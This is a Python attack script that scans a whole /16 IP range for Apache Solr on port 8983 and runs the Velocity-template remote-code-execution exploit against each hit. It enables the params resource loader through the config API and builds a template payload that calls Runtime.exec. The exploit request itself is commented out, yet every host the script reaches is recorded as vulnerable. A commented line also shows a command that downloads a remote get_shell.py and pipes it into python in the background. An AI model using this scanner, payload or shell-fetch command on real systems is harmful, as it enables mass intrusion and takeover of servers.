#!/opt/py3/bin/python3
import requests
import time
import json
import sys
import socket
import threadpool
from urllib.parse import quote


def get_port_status(ip, port=8983):
    time.sleep(0.1)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_DGRAM是udp协议,STREAM是tcp协议
    try:
        server.connect((ip, port))
        solr_port_open.append(ip)
    except Exception as err:
        pass
    finally:
        server.close()

# command = '/bin/bash -c echo && nohup curl -fsSL https://raw.githubusercontent.com/SuperLandy/Python/master/Security/get_shell.py | python  1>/dev/null 2>/dev/null &'

class SolrRce:
    def __init__(self, url, command='whoami'):
        self.url = "http://%s:8983" % url
        self.command = command
        self.core_name = self.get_core_name()
        self.available = self.enable_cort_params()
        self.exp()

    def get_core_name(self):
        core_name_url = self.url + "/solr/admin/cores?wt=json&indexInfo=false"
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
        }
        try:
            response = requests.get(core_name_url, headers=header, timeout=5)
            core_name = list(json.loads(response.text)["status"])
            if core_name:
                return core_name[0]
            else:
                return None
        except Exception:
            return None

    def enable_cort_params(self):
        if self.core_name is None:
            pass
        else:
            header = {
                "Content-Type": "application/json",
                "Content-Length": "259",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
            }
            body = {
                "update-queryresponsewriter": {
                    "startup": "lazy",
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "template.base.dir": "",
                    "solr.resource.loader.enabled": "true",
                    "params.resource.loader.enabled": "true"
                }
            }
            params_enable_url = self.url + "/solr/" + self.core_name + "/config"
            try:
                response = requests.post(url=params_enable_url, json=body, headers=header, timeout=5)
                if response.json()["responseHeader"]["status"] == 0:
                    return True
                else:
                    return False
            except Exception:
                return False

    def exp(self):
        if self.available is False or self.core_name is None:
            #print('url: %s is false!' % self.url)
            pass
        else:
            exp_code1 = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom="

            exp_code2 = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) " \
                        "#set($chr=$x.class.forName('java.lang.Character')) " \
                        "#set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('"
            exp_code3 = "')) $ex.waitFor() #set($out=$ex.getInputStream()) " \
                        "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"

            end_url = self.url + "/solr/" + self.core_name + exp_code1 + quote(exp_code2 + self.command +
                                                                               exp_code3, 'utf-8')
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
            }
            # cmd_result = requests.get(end_url, headers=header, timeout=5)
            solr_rce_host.append(self.url)
            #print("Url: %s command result: %s" % (self.url, cmd_result.text))


if __name__ == '__main__':
    start_ip = sys.argv[1] + '.'
    solr_port_open = []
    solr_rce_host = []
    socket.setdefaulttimeout(0.5)
    ip_addr = []
    for three_ip in range(0, 256):
        for end_ip in range(0, 255):
            ip = start_ip + str(three_ip) + '.' + str(end_ip)
            ip_addr.append(ip)
    port_scan_pool = threadpool.ThreadPool(1004)
    check_port = threadpool.makeRequests(get_port_status, ip_addr)
    for req in check_port:
        port_scan_pool.putRequest(req)
    port_scan_pool.wait()
    #print("solr port open: ", solr_port_open)
    

    solr_rce_pool = threadpool.ThreadPool(800)
    solr_rce = threadpool.makeRequests(SolrRce, solr_port_open)
    for req in solr_rce:
        solr_rce_pool.putRequest(req)
    solr_rce_pool.wait()
    print("solr rce host: ", solr_rce_host)

